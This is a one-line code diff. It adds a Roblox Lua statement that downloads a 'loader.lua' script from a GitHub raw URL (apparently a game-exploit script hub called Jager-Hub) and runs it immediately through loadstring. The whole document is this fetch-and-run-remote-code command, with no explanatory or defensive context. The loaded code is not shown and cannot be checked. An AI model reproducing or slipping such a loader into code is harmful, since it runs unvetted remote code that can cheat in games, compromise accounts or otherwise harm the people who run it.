@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jager-Hub/Scripts/refs/heads/main/loader.lua"))()
